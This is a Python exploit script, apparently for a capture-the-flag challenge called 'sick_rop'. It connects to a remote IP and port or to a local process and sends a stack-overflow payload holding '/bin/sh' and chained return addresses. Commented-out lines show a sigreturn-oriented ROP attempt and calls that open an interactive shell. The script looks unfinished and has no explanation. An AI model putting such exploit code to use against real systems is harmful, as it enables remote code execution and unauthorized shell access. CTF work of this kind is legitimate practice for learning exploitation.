#!/usr/bin/env python
import ptrlib as ptr
import sys
import pwn

exe = ptr.ELF("./sick_rop")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        addr = "94.237.53.113:56245"
        addr = addr.split(":")
        host = addr[0]
        port = int(addr[1])
        return ptr.Socket(host, port)
    else:
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    # pwn.context.binary = pwn.ELF("./sick_rop")
    # sigret_frame = pwn.SigreturnFrame()
    # sigret_frame.rax = 0x3b
    # sigret_frame.rdi = ptr.p64(next(exe))

    pl = b"A" * 8
    pl += b"/bin/sh\x00"
    pl += b"A" * 8 * 3
    # pl += ptr.p64(
    #     next(
    #         exe.gadget(
    #             "mov eax, 1; mov edi, 1; mov rsi, [rsp+8]; mov rdx, [rsp+0x10]; syscall; ret;"
    #         )
    #     )
    # )
    # pl += ptr.p64()
    # pl += ptr.p64(unwrap(exe.symbol("read")))
    pl += ptr.p64(unwrap(exe.symbol("write")))
    pl += ptr.p64(unwrap(exe.symbol("write")))
    pl += ptr.p64(unwrap(exe.symbol("write")))
    pl += ptr.p64(unwrap(exe.symbol("write")))
    pl += ptr.p64(unwrap(exe.symbol("write")))
    pl += ptr.p64(unwrap(exe.symbol("write")))
    # pl += ptr.p64(unwrap(exe.symbol("vuln")))
    # pl += ptr.p64(next())
    # pl += ptr.p64(unwrap(exe.symbol("vuln")))
    # pl = pl.ljust(0x38, b"B")
    # pl += ptr.p64(0x18)
    # pl += ptr.p64(unwrap(exe.section(".bss")) + 0x100)
    # pl += ptr.p64(unwrap(exe.symbol("vuln")))
    # pl += ptr.p64(next(exe.gadget("syscall; ret;")))

    # input(">>")
    io.sendline(pl)
    # input(">>")
    # io.sendline(b"A" * 0xE)
    # io.recvuntil(b"\xff")
    # io.sh()
    print(io.recvuntil(b"pentenv/"))
    # io.sh()
    # input(">>")
    # io.recvuntil(b"BBBBBBBB")
    # io.recvuntil(b"BBBBBBBB")
    # io.recvuntil(b"BBBBBBBB")
    # print(io.recvscreen())
    # print(io.recvline())
    # io.sh()
    # input(">>")


if __name__ == "__main__":
    main()
